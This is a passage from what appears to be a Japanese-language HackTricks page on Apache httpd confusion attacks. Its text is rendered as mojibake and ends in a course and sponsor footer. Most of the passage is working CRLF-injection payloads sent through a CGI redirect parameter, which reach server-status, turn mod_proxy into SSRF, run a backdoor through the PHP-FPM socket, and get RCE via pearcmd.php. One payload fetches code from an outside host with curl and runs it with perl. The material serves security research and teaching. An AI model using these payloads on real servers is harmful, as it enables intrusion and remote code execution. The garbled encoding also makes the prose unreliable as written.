ä¾‹ãˆã° `/server-status` ã¯ãƒ­ãƒ¼ã‚«ãƒ«ã§ã®ã¿ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã§ã‚ã‚‹ã¹ãã§ã™ï¼š
```xml
<Location /server-status>
SetHandler server-status
Require local
</Location>
```
`Content-Type`ã‚’`server-status`ã«è¨­å®šã—ã€Locationãƒ˜ãƒƒãƒ€ãƒ¼ã‚’`/`ã§å§‹ã‚ã‚‹ã“ã¨ã§ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo %0d%0a
Content-Type:server-status %0d%0a
%0d%0a
```
#### **ä»»æ„ã®ãƒãƒ³ãƒ‰ãƒ©ãƒ¼ã‹ã‚‰å®Œå…¨ãª SSRF ã¸**

`mod_proxy` ã«ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã—ã¦ã€ä»»æ„ã® URL ã®ä»»æ„ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:
http://example.com/%3F
%0d%0a
%0d%0a
```
ã—ã‹ã—ã€`X-Forwarded-For` ãƒ˜ãƒƒãƒ€ãƒ¼ãŒè¿½åŠ ã•ã‚Œã€ã‚¯ãƒ©ã‚¦ãƒ‰ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒé˜²æ­¢ã•ã‚Œã¾ã™ã€‚

#### **ãƒ­ãƒ¼ã‚«ãƒ«Unixãƒ‰ãƒ¡ã‚¤ãƒ³ã‚½ã‚±ãƒƒãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®ä»»æ„ã®ãƒãƒ³ãƒ‰ãƒ©ãƒ¼**

PHP-FPMã®ãƒ­ãƒ¼ã‚«ãƒ«Unixãƒ‰ãƒ¡ã‚¤ãƒ³ã‚½ã‚±ãƒƒãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã€`/tmp/` ã«ã‚ã‚‹PHPãƒãƒƒã‚¯ãƒ‰ã‚¢ã‚’å®Ÿè¡Œã—ã¾ã™ï¼š
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php %0d%0a
%0d%0a
```
#### **ä»»æ„ãƒãƒ³ãƒ‰ãƒ©ãƒ¼ã«ã‚ˆã‚‹RCE**

å…¬å¼ã® [PHP Docker](https://hub.docker.com/\_/php) ã‚¤ãƒ¡ãƒ¼ã‚¸ã«ã¯ã€ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³PHPãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ç®¡ç†ãƒ„ãƒ¼ãƒ«ã§ã‚ã‚‹PEARï¼ˆ`Pearcmd.php`ï¼‰ãŒå«ã¾ã‚Œã¦ãŠã‚Šã€ã“ã‚Œã‚’æ‚ªç”¨ã—ã¦RCEã‚’å–å¾—ã§ãã¾ã™ï¼š
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}
orange.tw/x|perl
) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
Check [**Docker PHP LFI Summary**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp) ã®è©³ç´°ã¯ã€[Phith0n](https://x.com/phithon\_xg) ã«ã‚ˆã£ã¦æ›¸ã‹ã‚Œã¦ã„ã¾ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) ã¾ãŸã¯ [**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ã¨ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
